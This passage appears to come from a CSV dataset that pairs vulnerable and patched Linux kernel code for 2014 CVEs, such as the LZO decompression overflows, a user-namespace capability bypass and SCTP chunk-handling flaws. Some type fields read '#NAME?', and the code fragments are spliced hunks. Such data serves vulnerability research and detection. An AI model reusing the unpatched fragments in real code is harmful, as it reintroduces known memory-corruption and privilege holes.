	change = memcmp(&ucontrol->value, ue->elem_data, ue->elem_data_size) != 0;
 if (change)
 memcpy(ue->elem_data, &ucontrol->value, ue->elem_data_size);
 mutex_unlock(&ue->card->user_ctl_lock);
 return change;
}

		new_data = memdup_user(tlv, size);
 if (IS_ERR(new_data))
 return PTR_ERR(new_data);
 mutex_lock(&ue->card->user_ctl_lock);
		change = ue->tlv_data_size != size;
 if (!change)
			change = memcmp(ue->tlv_data, new_data, size);
 kfree(ue->tlv_data);
		ue->tlv_data = new_data;
		ue->tlv_data_size = size;
 mutex_unlock(&ue->card->user_ctl_lock);
	} else {
 int ret = 0;

 mutex_lock(&ue->card->user_ctl_lock);
 if (!ue->tlv_data_size || !ue->tlv_data) {
			ret = -ENXIO;
 goto err_unlock;
		}
 if (size < ue->tlv_data_size) {
			ret = -ENOSPC;
 goto err_unlock;
		}
 if (copy_to_user(tlv, ue->tlv_data, ue->tlv_data_size))
			ret = -EFAULT;
err_unlock:
 mutex_unlock(&ue->card->user_ctl_lock);
 if (ret)
 return ret;
	}
 return change;
}
	ue = kzalloc(sizeof(struct user_element) + private_size, GFP_KERNEL);
 if (ue == NULL)
 return -ENOMEM;
	ue->card = card;
	ue->info = *info;
	ue->info.access = 0;
	ue->elem_data = (char *)ue + sizeof(*ue);
 INIT_LIST_HEAD(&card->devices);
 init_rwsem(&card->controls_rwsem);
 rwlock_init(&card->ctl_files_rwlock);
 mutex_init(&card->user_ctl_lock);
 INIT_LIST_HEAD(&card->controls);
 INIT_LIST_HEAD(&card->ctl_files);
 spin_lock_init(&card->files_lock);
"
2014,DoS Overflow Mem. Corr. ,CVE-2014-4611,"			len = *ip++;
 for (; len == 255; length += 255)
				len = *ip++;


			length += len;
		}

","			len = *ip++;
 for (; len == 255; length += 255)
				len = *ip++;
 if (unlikely(length > (size_t)(length + len)))
 goto _output_error;
			length += len;
		}

"
2014,DoS Overflow Mem. Corr. ,CVE-2014-4608,"#include <linux/lzo.h>
#include ""lzodefs.h""

#define HAVE_IP(x)      ((size_t)(ip_end - ip) >= (size_t)(x))
#define HAVE_OP(x)      ((size_t)(op_end - op) >= (size_t)(x))
#define NEED_IP(x)      if (!HAVE_IP(x)) goto input_overrun
#define NEED_OP(x)      if (!HAVE_OP(x)) goto output_overrun
#define TEST_LB(m_pos)  if ((m_pos) < out) goto lookbehind_overrun





















int lzo1x_decompress_safe(const unsigned char *in, size_t in_len,
 unsigned char *out, size_t *out_len)
 while (unlikely(*ip == 0)) {
						t += 255;
						ip++;
 NEED_IP(1);
					}
					t += 15 + *ip++;
				}
				t += 3;
copy_literal_run:
#if defined(CONFIG_HAVE_EFFICIENT_UNALIGNED_ACCESS)
 if (likely(HAVE_IP(t + 15) && HAVE_OP(t + 15))) {
 const unsigned char *ie = ip + t;
 unsigned char *oe = op + t;
 do {
				} else
#endif
				{
 NEED_OP(t);
 NEED_IP(t + 3);
 do {
						*op++ = *ip++;
					} while (--t > 0);
				m_pos -= t >> 2;
				m_pos -= *ip++ << 2;
 TEST_LB(m_pos);
 NEED_OP(2);
				op[0] = m_pos[0];
				op[1] = m_pos[1];
				op += 2;
 while (unlikely(*ip == 0)) {
					t += 255;
					ip++;
 NEED_IP(1);
				}
				t += 31 + *ip++;
 NEED_IP(2);
			}
			m_pos = op - 1;
			next = get_unaligned_le16(ip);
 while (unlikely(*ip == 0)) {
					t += 255;
					ip++;
 NEED_IP(1);
				}
				t += 7 + *ip++;
 NEED_IP(2);
			}
			next = get_unaligned_le16(ip);
			ip += 2;
#if defined(CONFIG_HAVE_EFFICIENT_UNALIGNED_ACCESS)
 if (op - m_pos >= 8) {
 unsigned char *oe = op + t;
 if (likely(HAVE_OP(t + 15))) {
 do {
 COPY8(op, m_pos);
					op += 8;
					m_pos += 8;
				} while (op < oe);
				op = oe;
 if (HAVE_IP(6)) {
					state = next;
 COPY4(op, ip);
					op += next;
					ip += next;
 continue;
				}
			} else {
 NEED_OP(t);
 do {
					*op++ = *m_pos++;
				} while (op < oe);
#endif
		{
 unsigned char *oe = op + t;
 NEED_OP(t);
			op[0] = m_pos[0];
			op[1] = m_pos[1];
			op += 2;
		state = next;
		t = next;
#if defined(CONFIG_HAVE_EFFICIENT_UNALIGNED_ACCESS)
 if (likely(HAVE_IP(6) && HAVE_OP(4))) {
 COPY4(op, ip);
			op += t;
			ip += t;
		} else
#endif
		{
 NEED_IP(t + 3);
 NEED_OP(t);
 while (t > 0) {
				*op++ = *ip++;
				t--;
","#include <linux/lzo.h>
#include ""lzodefs.h""

#define HAVE_IP(t, x)					\
	(((size_t)(ip_end - ip) >= (size_t)(t + x)) &&	\
	 (((t + x) >= t) && ((t + x) >= x)))

#define HAVE_OP(t, x)					\
	(((size_t)(op_end - op) >= (size_t)(t + x)) &&	\
	 (((t + x) >= t) && ((t + x) >= x)))

#define NEED_IP(t, x)					\
 do {						\
 if (!HAVE_IP(t, x))			\
 goto input_overrun;		\
	} while (0)

#define NEED_OP(t, x)					\
 do {						\
 if (!HAVE_OP(t, x))			\
 goto output_overrun;		\
	} while (0)

#define TEST_LB(m_pos)					\
 do {						\
 if ((m_pos) < out)			\
 goto lookbehind_overrun;	\
	} while (0)

int lzo1x_decompress_safe(const unsigned char *in, size_t in_len,
 unsigned char *out, size_t *out_len)
 while (unlikely(*ip == 0)) {
						t += 255;
						ip++;
 NEED_IP(1, 0);
					}
					t += 15 + *ip++;
				}
				t += 3;
copy_literal_run:
#if defined(CONFIG_HAVE_EFFICIENT_UNALIGNED_ACCESS)
 if (likely(HAVE_IP(t, 15) && HAVE_OP(t, 15))) {
 const unsigned char *ie = ip + t;
 unsigned char *oe = op + t;
 do {
				} else
#endif
				{
 NEED_OP(t, 0);
 NEED_IP(t, 3);
 do {
						*op++ = *ip++;
					} while (--t > 0);
				m_pos -= t >> 2;
				m_pos -= *ip++ << 2;
 TEST_LB(m_pos);
 NEED_OP(2, 0);
				op[0] = m_pos[0];
				op[1] = m_pos[1];
				op += 2;
 while (unlikely(*ip == 0)) {
					t += 255;
					ip++;
 NEED_IP(1, 0);
				}
				t += 31 + *ip++;
 NEED_IP(2, 0);
			}
			m_pos = op - 1;
			next = get_unaligned_le16(ip);
 while (unlikely(*ip == 0)) {
					t += 255;
					ip++;
 NEED_IP(1, 0);
				}
				t += 7 + *ip++;
 NEED_IP(2, 0);
			}
			next = get_unaligned_le16(ip);
			ip += 2;
#if defined(CONFIG_HAVE_EFFICIENT_UNALIGNED_ACCESS)
 if (op - m_pos >= 8) {
 unsigned char *oe = op + t;
 if (likely(HAVE_OP(t, 15))) {
 do {
 COPY8(op, m_pos);
					op += 8;
					m_pos += 8;
				} while (op < oe);
				op = oe;
 if (HAVE_IP(6, 0)) {
					state = next;
 COPY4(op, ip);
					op += next;
					ip += next;
 continue;
				}
			} else {
 NEED_OP(t, 0);
 do {
					*op++ = *m_pos++;
				} while (op < oe);
#endif
		{
 unsigned char *oe = op + t;
 NEED_OP(t, 0);
			op[0] = m_pos[0];
			op[1] = m_pos[1];
			op += 2;
		state = next;
		t = next;
#if defined(CONFIG_HAVE_EFFICIENT_UNALIGNED_ACCESS)
 if (likely(HAVE_IP(6, 0) && HAVE_OP(4, 0))) {
 COPY4(op, ip);
			op += t;
			ip += t;
		} else
#endif
		{
 NEED_IP(t, 3);
 NEED_OP(t, 0);
 while (t > 0) {
				*op++ = *ip++;
				t--;
"
2014,DoS ,CVE-2014-4508,,
2014,#NAME?,CVE-2014-4323,,
2014,DoS +Priv Mem. Corr. ,CVE-2014-4322,,
2014,DoS ,CVE-2014-4171,,
2014,Bypass ,CVE-2014-4157,"#define _TIF_SYSCALL_TRACEPOINT	(1<<TIF_SYSCALL_TRACEPOINT)

#define _TIF_WORK_SYSCALL_ENTRY	(_TIF_NOHZ | _TIF_SYSCALL_TRACE |	\
				 _TIF_SYSCALL_AUDIT | _TIF_SYSCALL_TRACEPOINT)


/* work to do in syscall_trace_leave() */
#define _TIF_WORK_SYSCALL_EXIT	(_TIF_NOHZ | _TIF_SYSCALL_TRACE |	\
","#define _TIF_SYSCALL_TRACEPOINT	(1<<TIF_SYSCALL_TRACEPOINT)

#define _TIF_WORK_SYSCALL_ENTRY	(_TIF_NOHZ | _TIF_SYSCALL_TRACE |	\
				 _TIF_SYSCALL_AUDIT | \
				 _TIF_SYSCALL_TRACEPOINT | _TIF_SECCOMP)

/* work to do in syscall_trace_leave() */
#define _TIF_WORK_SYSCALL_EXIT	(_TIF_NOHZ | _TIF_SYSCALL_TRACE |	\
"
2014,#NAME?,CVE-2014-4027,"	hba->hba_ptr = NULL;
}

/*	rd_release_device_space():
 *
 *
 */
static void rd_release_device_space(struct rd_dev *rd_dev)
{
	u32 i, j, page_count = 0, sg_per_table;
 struct rd_dev_sg_table *sg_table;
 struct page *pg;
 struct scatterlist *sg;


 if (!rd_dev->sg_table_array || !rd_dev->sg_table_count)
 return;

	sg_table = rd_dev->sg_table_array;

 for (i = 0; i < rd_dev->sg_table_count; i++) {
		sg = sg_table[i].sg_table;
		sg_per_table = sg_table[i].rd_sg_count;

				page_count++;
			}
		}

 kfree(sg);
	}















 pr_debug(""CORE_RD[%u] - Released device space for Ramdisk""
 "" Device ID: %u, pages %u in %u tables total bytes %lu\n"",
		rd_dev->rd_host->rd_host_id, rd_dev->rd_dev_id, page_count,
		rd_dev->sg_table_count, (unsigned long)page_count * PAGE_SIZE);

 kfree(sg_table);
	rd_dev->sg_table_array = NULL;
	rd_dev->sg_table_count = 0;
}
 *
 *
 */
static int rd_build_device_space(struct rd_dev *rd_dev)

{
	u32 i = 0, j, page_offset = 0, sg_per_table, sg_tables, total_sg_needed;
	u32 max_sg_per_table = (RD_MAX_ALLOCATION_SIZE /
 sizeof(struct scatterlist));
 struct rd_dev_sg_table *sg_table;
 struct page *pg;
 struct scatterlist *sg;

 if (rd_dev->rd_page_count <= 0) {
 pr_err(""Illegal page count: %u for Ramdisk device\n"",
			rd_dev->rd_page_count);
 return -EINVAL;
	}

 /* Don't need backing pages for NULLIO */
 if (rd_dev->rd_flags & RDF_NULLIO)
 return 0;

	total_sg_needed = rd_dev->rd_page_count;

	sg_tables = (total_sg_needed / max_sg_per_table) + 1;

	sg_table = kzalloc(sg_tables * sizeof(struct rd_dev_sg_table), GFP_KERNEL);
 if (!sg_table) {
 pr_err(""Unable to allocate memory for Ramdisk""
 "" scatterlist tables\n"");
 return -ENOMEM;
	}

	rd_dev->sg_table_array = sg_table;
	rd_dev->sg_table_count = sg_tables;

 while (total_sg_needed) {
		sg_per_table = (total_sg_needed > max_sg_per_table) ?
			}
 sg_assign_page(&sg[j], pg);
			sg[j].length = PAGE_SIZE;




		}

		page_offset += sg_per_table;
		total_sg_needed -= sg_per_table;
	}








































 pr_debug(""CORE_RD[%u] - Built Ramdisk Device ID: %u space of""
 "" %u pages in %u tables\n"", rd_dev->rd_host->rd_host_id,
		rd_dev->rd_dev_id, rd_dev->rd_page_count,
		rd_dev->sg_table_count);

 return 0;
}
","	hba->hba_ptr = NULL;
}

static u32 rd_release_sgl_table(struct rd_dev *rd_dev, struct rd_dev_sg_table *sg_table,
				 u32 sg_table_count)



{


 struct page *pg;
 struct scatterlist *sg;
	u32 i, j, page_count = 0, sg_per_table;

 for (i = 0; i < sg_table_count; i++) {





		sg = sg_table[i].sg_table;
		sg_per_table = sg_table[i].rd_sg_count;

				page_count++;
			}
		}

 kfree(sg);
	}

 kfree(sg_table);
 return page_count;
}

static void rd_release_device_space(struct rd_dev *rd_dev)
{
	u32 page_count;

 if (!rd_dev->sg_table_array || !rd_dev->sg_table_count)
 return;

	page_count = rd_release_sgl_table(rd_dev, rd_dev->sg_table_array,
					  rd_dev->sg_table_count);

 pr_debug(""CORE_RD[%u] - Released device space for Ramdisk""
 "" Device ID: %u, pages %u in %u tables total bytes %lu\n"",
		rd_dev->rd_host->rd_host_id, rd_dev->rd_dev_id, page_count,
		rd_dev->sg_table_count, (unsigned long)page_count * PAGE_SIZE);


	rd_dev->sg_table_array = NULL;
	rd_dev->sg_table_count = 0;
}
 *
 *
 */
static int rd_allocate_sgl_table(struct rd_dev *rd_dev, struct rd_dev_sg_table *sg_table,
				 u32 total_sg_needed, unsigned char init_payload)
{
	u32 i = 0, j, page_offset = 0, sg_per_table;
	u32 max_sg_per_table = (RD_MAX_ALLOCATION_SIZE /
 sizeof(struct scatterlist));

 struct page *pg;
 struct scatterlist *sg;
 unsigned char *p;
























 while (total_sg_needed) {
		sg_per_table = (total_sg_needed > max_sg_per_table) ?
			}
 sg_assign_page(&sg[j], pg);
			sg[j].length = PAGE_SIZE;

			p = kmap(pg);
 memset(p, init_payload, PAGE_SIZE);
 kunmap(pg);
		}

		page_offset += sg_per_table;
		total_sg_needed -= sg_per_table;
	}

 return 0;
}

static int rd_build_device_space(struct rd_dev *rd_dev)
{
 struct rd_dev_sg_table *sg_table;
	u32 sg_tables, total_sg_needed;
	u32 max_sg_per_table = (RD_MAX_ALLOCATION_SIZE /
 sizeof(struct scatterlist));
 int rc;

 if (rd_dev->rd_page_count <= 0) {
 pr_err(""Illegal page count: %u for Ramdisk device\n"",
		       rd_dev->rd_page_count);
 return -EINVAL;
	}

 /* Don't need backing pages for NULLIO */
 if (rd_dev->rd_flags & RDF_NULLIO)
 return 0;

	total_sg_needed = rd_dev->rd_page_count;

	sg_tables = (total_sg_needed / max_sg_per_table) + 1;

	sg_table = kzalloc(sg_tables * sizeof(struct rd_dev_sg_table), GFP_KERNEL);
 if (!sg_table) {
 pr_err(""Unable to allocate memory for Ramdisk""
 "" scatterlist tables\n"");
 return -ENOMEM;
	}

	rd_dev->sg_table_array = sg_table;
	rd_dev->sg_table_count = sg_tables;

	rc = rd_allocate_sgl_table(rd_dev, sg_table, total_sg_needed, 0x00);
 if (rc)
 return rc;

 pr_debug(""CORE_RD[%u] - Built Ramdisk Device ID: %u space of""
  "" %u pages in %u tables\n"", rd_dev->rd_host->rd_host_id,
  rd_dev->rd_dev_id, rd_dev->rd_page_count,
  rd_dev->sg_table_count);

 return 0;
}
"
2014,Bypass ,CVE-2014-4014," if ((ia_valid & ATTR_UID) &&
	    (!uid_eq(current_fsuid(), inode->i_uid) ||
	     !uid_eq(attr->ia_uid, inode->i_uid)) &&
	    !inode_capable(inode, CAP_CHOWN))
 return -EPERM;

 /* Make sure caller can chgrp. */
 if ((ia_valid & ATTR_GID) &&
	    (!uid_eq(current_fsuid(), inode->i_uid) ||
	    (!in_group_p(attr->ia_gid) && !gid_eq(attr->ia_gid, inode->i_gid))) &&
	    !inode_capable(inode, CAP_CHOWN))
 return -EPERM;

 /* Make sure a caller can chmod. */
 /* Also check the setgid bit! */
 if (!in_group_p((ia_valid & ATTR_GID) ? attr->ia_gid :
				inode->i_gid) &&
		    !inode_capable(inode, CAP_FSETID))
			attr->ia_mode &= ~S_ISGID;
	}

 umode_t mode = attr->ia_mode;

 if (!in_group_p(inode->i_gid) &&
		    !inode_capable(inode, CAP_FSETID))
			mode &= ~S_ISGID;
		inode->i_mode = mode;
	}
 * inode_owner_or_capable - check current task permissions to inode
 * @inode: inode being checked
 *
 * Return true if current either has CAP_FOWNER to the inode, or
 * owns the file.
 */
bool inode_owner_or_capable(const struct inode *inode)
{


 if (uid_eq(current_fsuid(), inode->i_uid))
 return true;
 if (inode_capable(inode, CAP_FOWNER))


 return true;
 return false;
}

 if (S_ISDIR(inode->i_mode)) {
 /* DACs are overridable for directories */
 if (inode_capable(inode, CAP_DAC_OVERRIDE))
 return 0;
 if (!(mask & MAY_WRITE))
 if (inode_capable(inode, CAP_DAC_READ_SEARCH))

 return 0;
 return -EACCES;
	}
	 * at least one exec bit set.
 */
 if (!(mask & MAY_EXEC) || (inode->i_mode & S_IXUGO))
 if (inode_capable(inode, CAP_DAC_OVERRIDE))
 return 0;

 /*
	 * Searching includes executable on directories, else just read.
 */
	mask &= MAY_READ | MAY_WRITE | MAY_EXEC;
 if (mask == MAY_READ)
 if (inode_capable(inode, CAP_DAC_READ_SEARCH))
 return 0;

 return -EACCES;
 return 0;
 if (uid_eq(dir->i_uid, fsuid))
 return 0;
 return !inode_capable(inode, CAP_FOWNER);
}

/*
		 * cleared upon successful return from chown()
 */
 if ((ip->i_d.di_mode & (S_ISUID|S_ISGID)) &&
		    !inode_capable(VFS_I(ip), CAP_FSETID))
			ip->i_d.di_mode &= ~(S_ISUID|S_ISGID);

 /*
 struct user_namespace *ns, int cap);
extern bool capable(int cap);
extern bool ns_capable(struct user_namespace *ns, int cap);
extern bool inode_capable(const struct inode *inode, int cap);
extern bool file_ns_capable(const struct file *file, struct user_namespace *ns, int cap);

/* audit system wants to get cap info from files as well */
EXPORT_SYMBOL(capable);

/**
 * inode_capable - Check superior capability over inode
 * @inode: The inode in question
 * @cap: The capability in question
 *
 * Return true if the current task has the given superior capability
 * targeted at it's own user namespace and that the given inode is owned
 * by the current user namespace or a child namespace.
 *
 * Currently we check to see if an inode is owned by the current
 * user namespace by seeing if the inode's owner maps into the
 * current user namespace.
 *
 */
bool inode_capable(const struct inode *inode, int cap)
{
 struct user_namespace *ns = current_user_ns();

 return ns_capable(ns, cap) && kuid_has_mapping(ns, inode->i_uid);

}
EXPORT_SYMBOL(inode_capable);
"," if ((ia_valid & ATTR_UID) &&
	    (!uid_eq(current_fsuid(), inode->i_uid) ||
	     !uid_eq(attr->ia_uid, inode->i_uid)) &&
	    !capable_wrt_inode_uidgid(inode, CAP_CHOWN))
 return -EPERM;

 /* Make sure caller can chgrp. */
 if ((ia_valid & ATTR_GID) &&
	    (!uid_eq(current_fsuid(), inode->i_uid) ||
	    (!in_group_p(attr->ia_gid) && !gid_eq(attr->ia_gid, inode->i_gid))) &&
	    !capable_wrt_inode_uidgid(inode, CAP_CHOWN))
 return -EPERM;

 /* Make sure a caller can chmod. */
 /* Also check the setgid bit! */
 if (!in_group_p((ia_valid & ATTR_GID) ? attr->ia_gid :
				inode->i_gid) &&
		    !capable_wrt_inode_uidgid(inode, CAP_FSETID))
			attr->ia_mode &= ~S_ISGID;
	}

 umode_t mode = attr->ia_mode;

 if (!in_group_p(inode->i_gid) &&
		    !capable_wrt_inode_uidgid(inode, CAP_FSETID))
			mode &= ~S_ISGID;
		inode->i_mode = mode;
	}
 * inode_owner_or_capable - check current task permissions to inode
 * @inode: inode being checked
 *
 * Return true if current either has CAP_FOWNER in a namespace with the
 * inode owner uid mapped, or owns the file.
 */
bool inode_owner_or_capable(const struct inode *inode)
{
 struct user_namespace *ns;

 if (uid_eq(current_fsuid(), inode->i_uid))
 return true;

	ns = current_user_ns();
 if (ns_capable(ns, CAP_FOWNER) && kuid_has_mapping(ns, inode->i_uid))
 return true;
 return false;
}

 if (S_ISDIR(inode->i_mode)) {
 /* DACs are overridable for directories */
 if (capable_wrt_inode_uidgid(inode, CAP_DAC_OVERRIDE))
 return 0;
 if (!(mask & MAY_WRITE))
 if (capable_wrt_inode_uidgid(inode,
						     CAP_DAC_READ_SEARCH))
 return 0;
 return -EACCES;
	}
	 * at least one exec bit set.
 */
 if (!(mask & MAY_EXEC) || (inode->i_mode & S_IXUGO))
 if (capable_wrt_inode_uidgid(inode, CAP_DAC_OVERRIDE))
 return 0;

 /*
	 * Searching includes executable on directories, else just read.
 */
	mask &= MAY_READ | MAY_WRITE | MAY_EXEC;
 if (mask == MAY_READ)
 if (capable_wrt_inode_uidgid(inode, CAP_DAC_READ_SEARCH))
 return 0;

 return -EACCES;
 return 0;
 if (uid_eq(dir->i_uid, fsuid))
 return 0;
 return !capable_wrt_inode_uidgid(inode, CAP_FOWNER);
}

/*
		 * cleared upon successful return from chown()
 */
 if ((ip->i_d.di_mode & (S_ISUID|S_ISGID)) &&
		    !capable_wrt_inode_uidgid(VFS_I(ip), CAP_FSETID))
			ip->i_d.di_mode &= ~(S_ISUID|S_ISGID);

 /*
 struct user_namespace *ns, int cap);
extern bool capable(int cap);
extern bool ns_capable(struct user_namespace *ns, int cap);
extern bool capable_wrt_inode_uidgid(const struct inode *inode, int cap);
extern bool file_ns_capable(const struct file *file, struct user_namespace *ns, int cap);

/* audit system wants to get cap info from files as well */
EXPORT_SYMBOL(capable);

/**
 * capable_wrt_inode_uidgid - Check nsown_capable and uid and gid mapped
 * @inode: The inode in question
 * @cap: The capability in question
 *
 * Return true if the current task has the given capability targeted at
 * its own user namespace and that the given inode's uid and gid are
 * mapped into the current user namespace.





 */
bool capable_wrt_inode_uidgid(const struct inode *inode, int cap)
{
 struct user_namespace *ns = current_user_ns();

 return ns_capable(ns, cap) && kuid_has_mapping(ns, inode->i_uid) &&
 kgid_has_mapping(ns, inode->i_gid);
}
EXPORT_SYMBOL(capable_wrt_inode_uidgid);
"
2014,DoS Mem. Corr. ,CVE-2014-3940,,
2014,DoS +Info ,CVE-2014-3917,,
2014,DoS ,CVE-2014-3690," int           gs_ldt_reload_needed;
 int           fs_reload_needed;
		u64           msr_host_bndcfgs;

	} host_state;
 struct {
 int vm86_active;
	u32 low32, high32;
 unsigned long tmpl;
 struct desc_ptr dt;


 vmcs_writel(HOST_CR0, read_cr0() & ~X86_CR0_TS);  /* 22.2.3 */
 vmcs_writel(HOST_CR4, read_cr4());  /* 22.2.3, 22.2.5 */
 vmcs_writel(HOST_CR3, read_cr3());  /* 22.2.3  FIXME: shadow tables */






 vmcs_write16(HOST_CS_SELECTOR, __KERNEL_CS);  /* 22.2.4 */
#ifdef CONFIG_X86_64
 /*
static void __noclone vmx_vcpu_run(struct kvm_vcpu *vcpu)
{
 struct vcpu_vmx *vmx = to_vmx(vcpu);
 unsigned long debugctlmsr;

 /* Record the guest's net vcpu time for enforced NMI injections. */
 if (unlikely(!cpu_has_virtual_nmis() && vmx->soft_vnmi_blocked))
 if (test_bit(VCPU_REGS_RIP, (unsigned long *)&vcpu->arch.regs_dirty))
 vmcs_writel(GUEST_RIP, vcpu->arch.regs[VCPU_REGS_RIP]);







 /* When single-stepping over STI and MOV SS, we must clear the
	 * corresponding interruptibility bits in the guest state. Otherwise
	 * vmentry fails as it then expects bit 14 (BS) in pending debug
"," int           gs_ldt_reload_needed;
 int           fs_reload_needed;
		u64           msr_host_bndcfgs;
 unsigned long vmcs_host_cr4;	/* May not match real cr4 */
	} host_state;
 struct {
 int vm86_active;
	u32 low32, high32;
 unsigned long tmpl;
 struct desc_ptr dt;
 unsigned long cr4;

 vmcs_writel(HOST_CR0, read_cr0() & ~X86_CR0_TS);  /* 22.2.3 */

 vmcs_writel(HOST_CR3, read_cr3());  /* 22.2.3  FIXME: shadow tables */

 /* Save the most likely value for this task's CR4 in the VMCS. */
	cr4 = read_cr4();
 vmcs_writel(HOST_CR4, cr4);			/* 22.2.3, 22.2.5 */
	vmx->host_state.vmcs_host_cr4 = cr4;

 vmcs_write16(HOST_CS_SELECTOR, __KERNEL_CS);  /* 22.2.4 */
#ifdef CONFIG_X86_64
 /*
static void __noclone vmx_vcpu_run(struct kvm_vcpu *vcpu)
{
 struct vcpu_vmx *vmx = to_vmx(vcpu);
 unsigned long debugctlmsr, cr4;

 /* Record the guest's net vcpu time for enforced NMI injections. */
 if (unlikely(!cpu_has_virtual_nmis() && vmx->soft_vnmi_blocked))
 if (test_bit(VCPU_REGS_RIP, (unsigned long *)&vcpu->arch.regs_dirty))
 vmcs_writel(GUEST_RIP, vcpu->arch.regs[VCPU_REGS_RIP]);

	cr4 = read_cr4();
 if (unlikely(cr4 != vmx->host_state.vmcs_host_cr4)) {
 vmcs_writel(HOST_CR4, cr4);
		vmx->host_state.vmcs_host_cr4 = cr4;
	}

 /* When single-stepping over STI and MOV SS, we must clear the
	 * corresponding interruptibility bits in the guest state. Otherwise
	 * vmentry fails as it then expects bit 14 (BS) in pending debug
"
2014,DoS ,CVE-2014-3688,"		} else {
 /* Nothing to do. Next chunk in the packet, please. */
			ch = (sctp_chunkhdr_t *) chunk->chunk_end;

 /* Force chunk->skb->data to chunk->chunk_end.  */
 skb_pull(chunk->skb,
				 chunk->chunk_end - chunk->skb->data);

 /* Verify that we have at least chunk headers
			 * worth of buffer left.
 */
 if (skb_headlen(chunk->skb) < sizeof(sctp_chunkhdr_t)) {
 sctp_chunk_free(chunk);
				chunk = queue->in_progress = NULL;
			}
		}
	}

 skb_pull(chunk->skb, sizeof(sctp_chunkhdr_t));
	chunk->subh.v = NULL; /* Subheader is no longer valid.  */

 if (chunk->chunk_end < skb_tail_pointer(chunk->skb)) {

 /* This is not a singleton */
		chunk->singleton = 0;
	} else if (chunk->chunk_end > skb_tail_pointer(chunk->skb)) {
 /* RFC 2960, Section 6.10  Bundling
		 *
		 * Partial chunks MUST NOT be placed in an SCTP packet.
		 * If the receiver detects a partial chunk, it MUST drop
		 * the chunk.
		 *
		 * Since the end of the chunk is past the end of our buffer
		 * (which contains the whole packet, we can freely discard
		 * the whole packet.
 */
 sctp_chunk_free(chunk);
		chunk = queue->in_progress = NULL;

 return NULL;
	} else {
 /* We are at the end of the packet, so mark the chunk
		 * in case we need to send a SACK.
{
	__u16 chunk_length = ntohs(chunk->chunk_hdr->length);




 if (unlikely(chunk_length < required_length))
 return 0;

","		} else {
 /* Nothing to do. Next chunk in the packet, please. */
			ch = (sctp_chunkhdr_t *) chunk->chunk_end;

 /* Force chunk->skb->data to chunk->chunk_end.  */
 skb_pull(chunk->skb, chunk->chunk_end - chunk->skb->data);
 /* We are guaranteed to pull a SCTP header. */








		}
	}

 skb_pull(chunk->skb, sizeof(sctp_chunkhdr_t));
	chunk->subh.v = NULL; /* Subheader is no longer valid.  */

 if (chunk->chunk_end + sizeof(sctp_chunkhdr_t) <
 skb_tail_pointer(chunk->skb)) {
 /* This is not a singleton */
		chunk->singleton = 0;
	} else if (chunk->chunk_end > skb_tail_pointer(chunk->skb)) {
 /* Discard inside state machine. */
		chunk->pdiscard = 1;
		chunk->chunk_end = skb_tail_pointer(chunk->skb);











	} else {
 /* We are at the end of the packet, so mark the chunk
		 * in case we need to send a SACK.
{
	__u16 chunk_length = ntohs(chunk->chunk_hdr->length);

 /* Previously already marked? */
 if (unlikely(chunk->pdiscard))
 return 0;
 if (unlikely(chunk_length < required_length))
 return 0;

"
2014,DoS ,CVE-2014-3687,"	asoc->pmtu_pending = 0;
}






/* Walk through a list of TLV parameters.  Don't trust the
 * individual parameter lengths and instead depend on
 * the chunk length to indicate when to stop.  Make sure
	 * ack chunk whose serial number matches that of the request.
 */
 list_for_each_entry(ack, &asoc->asconf_ack_list, transmitted_list) {


 if (ack->subh.addip_hdr->serial == serial) {
 sctp_chunk_hold(ack);
 return ack;
","	asoc->pmtu_pending = 0;
}

static inline bool sctp_chunk_pending(const struct sctp_chunk *chunk)
{
 return !list_empty(&chunk->list);
}

/* Walk through a list of TLV parameters.  Don't trust the
 * individual parameter lengths and instead depend on
 * the chunk length to indicate when to stop.  Make sure
	 * ack chunk whose serial number matches that of the request.
 */
 list_for_each_entry(ack, &asoc->asconf_ack_list, transmitted_list) {
 if (sctp_chunk_pending(ack))
 continue;
 if (ack->subh.addip_hdr->serial == serial) {
 sctp_chunk_hold(ack);
 return ack;
"
2014,DoS ,CVE-2014-3673," int, __be16);
struct sctp_chunk *sctp_make_asconf_set_prim(struct sctp_association *asoc,
 union sctp_addr *addr);
int sctp_verify_asconf(const struct sctp_association *asoc,
  struct sctp_paramhdr *param_hdr, void *chunk_end,
  struct sctp_paramhdr **errp);
struct sctp_chunk *sctp_process_asconf(struct sctp_association *asoc,
 struct sctp_chunk *asconf);
int sctp_process_asconf_ack(struct sctp_association *asoc,
 return SCTP_ERROR_NO_ERROR;
}

/* Verify the ASCONF packet before we process it.  */
int sctp_verify_asconf(const struct sctp_association *asoc,
 struct sctp_paramhdr *param_hdr, void *chunk_end,
 struct sctp_paramhdr **errp) {
 sctp_addip_param_t *asconf_param;

 union sctp_params param;
 int length, plen;

	param.v = (sctp_paramhdr_t *) param_hdr;
 while (param.v <= chunk_end - sizeof(sctp_paramhdr_t)) {
		length = ntohs(param.p->length);
		*errp = param.p;

 if (param.v > chunk_end - length ||
		    length < sizeof(sctp_paramhdr_t))
 return 0;


 switch (param.p->type) {












 case SCTP_PARAM_ADD_IP:
 case SCTP_PARAM_DEL_IP:
 case SCTP_PARAM_SET_PRIMARY:
			asconf_param = (sctp_addip_param_t *)param.v;
			plen = ntohs(asconf_param->param_hdr.length);
 if (plen < sizeof(sctp_addip_param_t) +
 sizeof(sctp_paramhdr_t))
 return 0;


 break;
 case SCTP_PARAM_SUCCESS_REPORT:
 case SCTP_PARAM_ADAPTATION_LAYER_IND:
 if (length != sizeof(sctp_addip_param_t))
 return 0;

 break;
 default:
 break;

		}

		param.v += WORD_ROUND(length);
	}

 if (param.v != chunk_end)
 return 0;






 return 1;
}

/* Process an incoming ASCONF chunk with the next expected serial no. and
struct sctp_chunk *sctp_process_asconf(struct sctp_association *asoc,
 struct sctp_chunk *asconf)
{



 sctp_addiphdr_t		*hdr;
 union sctp_addr_param	*addr_param;
 sctp_addip_param_t	*asconf_param;
 struct sctp_chunk	*asconf_ack;

	__be16	err_code;
 int	length = 0;
 int	chunk_len;
	__u32	serial;
 int	all_param_pass = 1;

	chunk_len = ntohs(asconf->chunk_hdr->length) - sizeof(sctp_chunkhdr_t);
	hdr = (sctp_addiphdr_t *)asconf->skb->data;
 goto done;

 /* Process the TLVs contained within the ASCONF chunk. */
 while (chunk_len > 0) {





		err_code = sctp_process_asconf_param(asoc, asconf,
 asconf_param);
 /* ADDIP 4.1 A7)
		 * If an error response is received for a TLV parameter,
		 * all TLVs with no response before the failed TLV are
		 * considered successful if not reported.  All TLVs after
		 * the failed response are considered unsuccessful unless
		 * a specific success indication is present for the parameter.
 */
 if (SCTP_ERROR_NO_ERROR != err_code)
			all_param_pass = 0;

